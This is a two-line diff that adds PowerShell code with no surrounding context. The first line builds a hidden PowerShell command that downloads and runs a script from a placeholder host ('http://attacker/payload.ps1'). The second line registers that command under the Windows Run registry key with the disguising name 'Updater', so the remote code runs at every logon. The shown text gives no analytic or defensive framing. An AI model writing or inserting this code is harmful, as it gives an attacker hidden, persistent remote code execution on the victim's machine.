@@ -1,0 +1,2 @@
+$payload = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $payload
